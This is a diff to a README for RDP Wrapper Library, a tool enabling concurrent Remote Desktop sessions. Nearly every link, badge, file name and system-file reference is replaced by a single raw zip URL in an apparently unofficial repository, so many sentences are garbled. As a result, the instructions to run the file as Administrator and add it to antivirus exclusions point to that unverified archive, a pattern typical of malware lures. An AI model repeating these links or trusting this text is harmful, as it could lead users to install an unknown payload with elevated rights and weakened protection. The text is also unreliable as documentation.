@@ -1,43 +1,43 @@
 # RDP Wrapper Library by Stas'M
 
-[![Telegram](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-![Environment](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip,%207,%208,%https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-[![Release](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-![License](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-![Downloads](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-![TotalDownloads](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
+[![Telegram](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+![Environment](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip,%207,%208,%https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+[![Release](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+![License](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+![Downloads](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+![TotalDownloads](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
 
 The goal of this project is to enable Remote Desktop Host support and concurrent RDP sessions on reduced functionality systems for home usage.
 
-RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip file remains untouched. Also this method is very strong against Windows Update.
+RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip file remains untouched. Also this method is very strong against Windows Update.
 
-[pVistaST]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pVistaHB]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin7ST]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin7HB]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin8DP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin8CP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin8RP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin8]:     https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin81P]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin81]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin10TP]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin10PTP]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[pWin10]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+[pVistaST]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pVistaHB]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin7ST]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin7HB]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin8DP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin8CP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin8RP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin8]:     https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin81P]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin81]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin10TP]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin10PTP]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[pWin10]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 
-[fVistaST]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fVistaHB]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin7ST]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin7HB]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin8DP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin8CP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin8RP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin8]:     https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin81P]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin81]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin10TP]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin10PTP]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[fWin10]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+[fVistaST]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fVistaHB]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin7ST]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin7HB]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin8DP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin8CP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin8RP]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin8]:     https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin81P]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin81]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin10TP]:  https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin10PTP]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[fWin10]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 
 | NT Version    | Screenshots |
 | ------------- | ----------- |
@@ -47,18 +47,18 @@ RDP Wrapper works as a layer between Service Control Manager and Terminal Servic
 | Windows 8.1   | [![Windows 8.1 Preview][pWin81P]][fWin81P] [![Windows 8.1][pWin81]][fWin81] |
 | Windows 10    | [![Windows 10 Technical Preview][pWin10TP]][fWin10TP] [![Windows 10 Pro Technical Preview][pWin10PTP]][fWin10PTP] [![Windows 10][pWin10]][fWin10] |
 ---
-[WinPPE]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+[WinPPE]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 
 This solution was inspired by [Windows Product Policy Editor][WinPPE], big thanks to **kost** :)
 
 — binarymaster
 
 ### Attention:
-It's recommended to have original https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip file with the RDP Wrapper installation. If you have modified it before with other patchers, it may become unstable and crash in any moment.
+It's recommended to have original https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip file with the RDP Wrapper installation. If you have modified it before with other patchers, it may become unstable and crash in any moment.
 
 ### Information:
 - Source code is available, so you can build it on your own
-- RDP Wrapper does not patch https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip, it loads termsrv with different parameters
+- RDP Wrapper does not patch https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip, it loads termsrv with different parameters
 - RDPWInst and RDPChecker can be redistributed without development folder and batch files
 - RDPWInst can be used for unattended installation / deployment
 - Windows 2000, XP and Server 2003 will not be supported
@@ -67,10 +67,10 @@ It's recommended to have original https://github.com/r2hloveu/rdpwrap/raw/refs/h
 - RDP host server on any Windows edition beginning from Vista
 - Console and remote sessions at the same time
 - Using the same user simultaneously for local and remote logon (see configuration app)
-- Up to [15 concurrent sessions](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) (the actual limitation depends on your hardware and OS version)
-- Console and RDP session shadowing (using [Task Manager in Windows 7](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) and lower, and [Remote Desktop Connection in Windows 8](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) and higher)
-- Full [multi-monitor support](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) for RDP host
-- https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip if you find a new feature not listed here, [tell us](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) ;)
+- Up to [15 concurrent sessions](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) (the actual limitation depends on your hardware and OS version)
+- Console and RDP session shadowing (using [Task Manager in Windows 7](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) and lower, and [Remote Desktop Connection in Windows 8](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) and higher)
+- Full [multi-monitor support](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) for RDP host
+- https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip if you find a new feature not listed here, [tell us](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) ;)
 
 ### Porting to other platforms:
 - **ARM** for Windows RT (see links below)
@@ -80,17 +80,17 @@ It's recommended to have original https://github.com/r2hloveu/rdpwrap/raw/refs/h
 - **x86 Delphi version** can be built with *Embarcadero RAD Studio 2010*
 - **x86/x64 C++ version** can be built with *Microsoft Visual Studio 2013*
 
-[andrewblock]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[mydigitallife]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip(works-with-Windows-8-1-Basic)
-[xda-dev]:       https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[yt-updating]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
-[yt-offsets]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+[andrewblock]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[mydigitallife]: https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip(works-with-Windows-8-1-Basic)
+[xda-dev]:       https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[yt-updating]:   https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
+[yt-offsets]:    https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 
 ### Links:
 - Official GitHub repository:
-<br>https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+<br>https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 - Official Telegram chat:
-<br>https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+<br>https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 - Active discussion in the comments here:
 <br>[Enable remote desktop on Windows 8 core / basic - Andrew Block .net][andrewblock]
 - MDL Projects and Applications thread here:
@@ -98,71 +98,71 @@ It's recommended to have original https://github.com/r2hloveu/rdpwrap/raw/refs/h
 - Some ideas about porting to ARM for Windows RT (post #23):
 <br>[\[Q\] Mod Windows RT to enable Remote Desktop][xda-dev]
 - Adding «Remote Desktop Users» group:
-<br>https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip
+<br>https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip
 
 #### Tutorial videos:
 - [~~Updating RDP Wrapper INI file manually~~][yt-updating] (now use installer to update INI file)
-- [How to find offsets for new https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip versions][yt-offsets]
+- [How to find offsets for new https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip versions][yt-offsets]
 
 ### Files in release package:
 
 | File name | Description |
 | --------- | ----------- |
-| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`  | RDP Wrapper Library installer/uninstaller |
-| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`  | Local RDP Checker (you can check the RDP is working) |
-| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`   | RDP Wrapper Configuration |
-| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`   | Quick install batch file |
-| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip` | Quick uninstall batch file |
-| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`    | Quick update batch file |
+| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`  | RDP Wrapper Library installer/uninstaller |
+| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`  | Local RDP Checker (you can check the RDP is working) |
+| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`   | RDP Wrapper Configuration |
+| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`   | Quick install batch file |
+| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip` | Quick uninstall batch file |
+| `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`    | Quick update batch file |
 
 ### Frequently Asked Questions
 
 > Where can I download the installer or binaries?
 
-In the [GitHub Releases](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) section.
+In the [GitHub Releases](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) section.
 
 > Is it legal to use this application?
 
-There is no definitive answer, see [this discussion](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip).
+There is no definitive answer, see [this discussion](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip).
 
 > The installer tries to access the Internet, is it normal behaviour?
 
-Yes, it works in online mode by default. You may disable it by removing `-o` flag in the `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip` file.
+Yes, it works in online mode by default. You may disable it by removing `-o` flag in the `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip` file.
 
 > What is online install mode?
 
-Online install mode introduced in version 1.6.1. When you installing RDP Wrapper first time using this mode, it will download [latest INI file](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) from GitHub. See [this discussion](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip).
+Online install mode introduced in version 1.6.1. When you installing RDP Wrapper first time using this mode, it will download [latest INI file](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) from GitHub. See [this discussion](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip).
 
 > What is INI file and why we need it?
 
-INI file was introduced in version 1.5. It stores system configuration for RDP Wrapper — general wrapping settings, binary patch codes, and per build specific data. When new `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip` build comes out, developer adds support for it by updating INI file in repository.
+INI file was introduced in version 1.5. It stores system configuration for RDP Wrapper — general wrapping settings, binary patch codes, and per build specific data. When new `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip` build comes out, developer adds support for it by updating INI file in repository.
 
 > Config Tool reports version 1.5, but I installed higher version. What's the matter?
 
-Beginning with version 1.5 the `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip` is not updated anymore, since all settings are stored in INI file. Deal with it.
+Beginning with version 1.5 the `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip` is not updated anymore, since all settings are stored in INI file. Deal with it.
 
 > Config Tool shows `[not supported]` and RDP doesn't work. What can I do?
 
-Make sure you're connected to the Internet and run `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`.
+Make sure you're connected to the Internet and run `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`.
 
 > Update doesn't help, it still shows `[not supported]`.
 
-Visit [issues](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) section, and check whether your `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip` build is listed here. If you can't find such issue, create a new — specify your build version for adding to support.
+Visit [issues](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) section, and check whether your `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip` build is listed here. If you can't find such issue, create a new — specify your build version for adding to support.
 
 > Why `RDPCheck` doesn't allow to change resolution and other settings?
 
-`RDPCheck` is a very simple application and only for testing purposes. You need to use Microsoft Remote Desktop Client (`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`) if you want to customize the settings. You can use `127.0.0.1` or `127.0.0.2` address for loopback connection.
+`RDPCheck` is a very simple application and only for testing purposes. You need to use Microsoft Remote Desktop Client (`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`) if you want to customize the settings. You can use `127.0.0.1` or `127.0.0.2` address for loopback connection.
 
 ### Known issues:
-- Beginning with Windows 8 **on tablet PCs** inactive sessions will be logged out by system - [more info](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-- Beginning with Windows 10 you can accidentally lock yourself from PC - [more info](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-- Beginning with the Creators Update for Windows 10 Home, RDP Wrapper will no longer work, claiming that the listener is `[not listening]` because of `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip` is missing - [more info](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip), [download links](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-- Terminal Service does not start after installing some updates or "Access Denied" issue - [#215](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip), [#101](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-- RDP Wrapper does not work with RemoteFX enabled hosts - [#127](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip), [#208](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip), [#216](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip)
-- RDP works, but https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip crashes on logon attempt - Windows Vista Starter RTM x86 (https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip `6.0.6000.16386`)
-- If Terminal Services hangs at startup, try to add **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`** to antivirus exclusions. Also try to isolate RDP Wrapper from other shared services by the command:
+- Beginning with Windows 8 **on tablet PCs** inactive sessions will be logged out by system - [more info](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+- Beginning with Windows 10 you can accidentally lock yourself from PC - [more info](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+- Beginning with the Creators Update for Windows 10 Home, RDP Wrapper will no longer work, claiming that the listener is `[not listening]` because of `https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip` is missing - [more info](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip), [download links](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+- Terminal Service does not start after installing some updates or "Access Denied" issue - [#215](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip), [#101](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+- RDP Wrapper does not work with RemoteFX enabled hosts - [#127](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip), [#208](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip), [#216](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip)
+- RDP works, but https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip crashes on logon attempt - Windows Vista Starter RTM x86 (https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip `6.0.6000.16386`)
+- If Terminal Services hangs at startup, try to add **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`** to antivirus exclusions. Also try to isolate RDP Wrapper from other shared services by the command:
 <br>`sc config TermService type= own`
-- RDP Wrapper can be removed by AVG Free Antivirus and [Norton Antivirus](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) - first make sure you downloaded [official release](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip) from GitHub, then add it to exclusions.
+- RDP Wrapper can be removed by AVG Free Antivirus and [Norton Antivirus](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) - first make sure you downloaded [official release](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip) from GitHub, then add it to exclusions.
 
 ---
 
@@ -172,12 +172,12 @@ Visit [issues](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86
 - Version 1.6.2
 - Installer updated
 - Include updated INI file for latest Windows builds
-- Added check for supported Windows versions ([#155](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip))
-- Added feature to take INI file from current directory ([#300](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip))
-- Added feature to restore https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip (missing in Windows 10 Home [#194](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip))
+- Added check for supported Windows versions ([#155](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip))
+- Added feature to take INI file from current directory ([#300](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip))
+- Added feature to restore https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip (missing in Windows 10 Home [#194](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip))
 - RDP Config updated
-- Added feature to allow custom start programs ([#13 (comment)](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip))
-- MSI installation package added ([#14](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip))
+- Added feature to allow custom start programs ([#13 (comment)](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip))
+- MSI installation package added ([#14](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip))
 
 #### 2016.08.01
 - Version 1.6.1
@@ -266,7 +266,7 @@ Visit [issues](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86
 #### 2013.10.22
 - Version 1.1
 - Stable release
-- Improved wrapper (now it can wrap internal unexported https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip SL Policy function)
+- Improved wrapper (now it can wrap internal unexported https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip SL Policy function)
 - Added support for Windows 8 Single Language (tested on Acer Tablet PC with Intel Atom Z2760)
 
 #### 2013.10.19
@@ -450,14 +450,14 @@ Visit [issues](https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86
 
 Installation instructions:
 - Download latest release binaries and unpack files
-- Right-click on **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`** and select Run as Administrator
+- Right-click on **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`** and select Run as Administrator
 - See command output for details
 
 To update INI file:
-- Right-click on **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`** and select Run as Administrator
+- Right-click on **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`** and select Run as Administrator
 - See command output for details
 
